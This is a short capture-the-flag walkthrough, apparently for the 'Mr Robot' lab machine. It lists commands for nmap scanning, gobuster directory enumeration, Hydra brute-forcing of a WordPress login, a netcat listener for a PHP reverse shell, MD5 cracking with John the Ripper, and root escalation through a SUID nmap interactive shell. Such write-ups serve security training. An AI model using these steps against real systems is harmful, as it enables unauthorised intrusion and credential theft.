
### Scan the network
```bash
$ nmap -sV -sC -oA scans/initial ip_address
```

### Examining the website
-  go to the /robots.txt route

### Gobuster
```bash
$ gobuster dir -u http://ip_address -w /usr/share/dirbuster/directory-list-2.3-small.txt -t 100 -q -o scans/gobuster-small.txt
```


### Hydra
```bash
$ hydra -L fsocity.dic -p test ip_address http-post-form "/wp-login.php:log=^USER^&pwd=PWD:^Invalid username" -t 30

$ hydra -l Elliot -P fsocity.dic ip_address http-post-form "/wp-login.php:log=^USER^&pwd=PWD:^The password you entered for the username" -t 30
```


### Netcat
```bash
$ rlwrap nc -lvnp 53
```
### PHP reverse shell
- search on google: php-reverse-shell
- copy the content of the php-reverse-shell.php
- click on archive on the wordpress page
- go to the /wp-content.php route
- you should have a reversed shell in your terminal

### Reverse shell, John the ripper and root escalation
```bash
$ ls
$ cat password.raw-md5 # copy the password and paste it in a file outside of the reverse shell
$ john md5.hash --wordlist=fsocity.dic --format=Raw-MD5

# in reverse-shell
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ su robot
$ find / -perm +6000 2>/dev/null | grep '/bin/'
$ /usr/local/bin/namp --interactive

namp> !sh
namp> ls /root # that gives you the last key
```